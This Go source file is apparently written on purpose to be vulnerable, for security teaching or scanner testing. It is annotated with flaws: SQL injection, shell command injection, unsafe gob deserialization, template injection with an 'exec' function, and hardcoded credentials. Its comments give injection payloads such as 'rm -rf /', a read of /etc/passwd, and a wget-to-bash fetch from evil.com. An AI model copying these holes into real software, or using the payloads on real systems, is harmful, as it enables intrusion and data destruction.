

package main

import (
	"bytes"
	"database/sql"
	"encoding/gob"
	"encoding/xml"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os/exec"
	"strings"
	texttemplate "text/template"

	_ "github.com/lib/pq"
)

// ─────────────────────────────────────────────
// DATABASE SETUP (shared)
// ─────────────────────────────────────────────

var db *sql.DB

func initDB() {
	var err error
	// VULN: credentials hardcoded (also a High issue, shown here for context)
	db, err = sql.Open("postgres", "host=localhost user=admin password=admin123 dbname=appdb sslmode=disable")
	if err != nil {
		log.Fatal(err)
	}
}

// ─────────────────────────────────────────────
// [CRITICAL] SQL INJECTION
// ─────────────────────────────────────────────

// User represents a user record from the database.
type User struct {
	ID       int
	Username string
	Email    string
	Role     string
}

// getUserByUsername fetches a user by directly interpolating the input into the SQL query.
// VULNERABLE: An attacker can pass `' OR '1'='1` to dump all records,
// or `'; DROP TABLE users; --` for destructive injection.
func getUserByUsername(username string) ([]User, error) {
	// ❌ VULN: direct string concatenation — never do this
	query := "SELECT id, username, email, role FROM users WHERE username = '" + username + "'"
	fmt.Println("[DEBUG] Executing query:", query)

	rows, err := db.Query(query) // SQL Injection point
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var u User
		if err := rows.Scan(&u.ID, &u.Username, &u.Email, &u.Role); err != nil {
			return nil, err
		}
		users = append(users, u)
	}
	return users, nil
}

// searchProducts builds a dynamic ORDER BY clause from user input — equally dangerous.
// VULNERABLE: attacker can inject `id; DROP TABLE products--`
func searchProducts(sortField string) ([]string, error) {
	// ❌ VULN: ORDER BY cannot use parameterised queries, so devs often interpolate — still wrong
	query := fmt.Sprintf("SELECT name FROM products ORDER BY %s ASC", sortField)
	rows, err := db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var products []string
	for rows.Next() {
		var name string
		if err := rows.Scan(&name); err != nil {
			return nil, err
		}
		products = append(products, name)
	}
	return products, nil
}

// loginUser performs login with SQL injection in both fields.
func loginUser(username, password string) bool {
	// ❌ VULN: classic authentication bypass — attacker supplies `admin'--` as username
	query := "SELECT COUNT(*) FROM users WHERE username='" + username +
		"' AND password='" + password + "'"
	var count int
	err := db.QueryRow(query).Scan(&count)
	if err != nil {
		return false
	}
	return count > 0
}

// ─────────────────────────────────────────────
// [CRITICAL] OS COMMAND INJECTION
// ─────────────────────────────────────────────

// pingHost pings a remote host supplied by the user.
// VULNERABLE: attacker passes `8.8.8.8; rm -rf /` to run arbitrary shell commands.
func pingHost(host string) (string, error) {
	// ❌ VULN: user-controlled input passed directly to shell
	cmd := exec.Command("sh", "-c", "ping -c 4 "+host)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// convertFile calls an external image tool with user-supplied filenames.
// VULNERABLE: filename = `input.jpg; cat /etc/passwd > /tmp/leak.txt`
func convertFile(inputFile, outputFile string) (string, error) {
	// ❌ VULN: shell=true equivalent with unsanitised filenames
	cmdStr := fmt.Sprintf("convert %s %s", inputFile, outputFile)
	cmd := exec.Command("bash", "-c", cmdStr)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// generateReport executes a Python reporting script, injecting the report name.
func generateReport(reportName string) (string, error) {
	// ❌ VULN: reportName could be `foo && wget http://evil.com/shell.sh | bash`
	cmd := exec.Command("sh", "-c", "python3 /opt/reports/gen.py "+reportName)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// ─────────────────────────────────────────────
// [CRITICAL] UNSAFE DESERIALIZATION
// ─────────────────────────────────────────────

// GobPayload is what the server deserialises from client-controlled bytes.
type GobPayload struct {
	UserID  int
	Command string
	Data    interface{} // interface{} makes this especially dangerous with gob
}

// deserializeRequest decodes a gob-encoded payload directly from the request body.
// VULNERABLE: gob can deserialise arbitrary types registered via gob.Register;
// a malicious client can send crafted bytes to trigger unintended code paths or panics.
func deserializeRequest(r *http.Request) (*GobPayload, error) {
	// ❌ VULN: deserialising untrusted, user-supplied bytes without validation
	dec := gob.NewDecoder(r.Body)
	var payload GobPayload
	if err := dec.Decode(&payload); err != nil {
		return nil, err
	}
	// VULN: acting on Command field from attacker-controlled struct
	if payload.Command == "exec" {
		cmd := exec.Command("sh", "-c", fmt.Sprintf("%v", payload.Data))
		cmd.Run()
	}
	return &payload, nil
}

// ─────────────────────────────────────────────
// [CRITICAL] SERVER-SIDE TEMPLATE INJECTION (SSTI)
// ─────────────────────────────────────────────

// renderWelcome renders an HTML page using user-supplied name in text/template (not html/template).
// VULNERABLE: text/template does NOT auto-escape HTML or prevent calling arbitrary functions.
// Attacker payload: `{{.Name | printf "%s"}}` can chain to dangerous funcs if a FuncMap is set.
func renderWelcome(w http.ResponseWriter, name string) {
	// ❌ VULN: using text/template with user-controlled template string
	tmplStr := "<h1>Welcome, " + name + "!</h1>" // name is injected INTO the template source
	tmpl, err := texttemplate.New("welcome").Parse(tmplStr)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// renderProfilePage lets the user define their own template (extreme SSTI).
func renderProfilePage(w http.ResponseWriter, userTemplate string, data map[string]string) {
	// ❌ VULN: parsing attacker-supplied template string — full SSTI
	funcMap := texttemplate.FuncMap{
		"exec": func(cmd string) string {
			out, _ := exec.Command("sh", "-c", cmd).Output()
			return string(out)
		},
	}
	tmpl, err := texttemplate.New("profile").Funcs(funcMap).Parse(userTemplate)
	if err != nil {
		http.Error(w, "Template error: "+err.Error(), 500)
		return
	}
	if err := tmpl.Execute(w, data); err != nil {
		http.Error(w, err.Error(), 500)
	}
}

// safeRenderNotice is the correct way — uses html/template with static template.
// Provided here as contrast / reference.
func safeRenderNotice(w http.ResponseWriter, notice string) {
	const tmplStr = `<p>Notice: {{.Notice}}</p>`
	tmpl := template.Must(template.New("notice").Parse(tmplStr))
	tmpl.Execute(w, map[string]string{"Notice": notice})
}

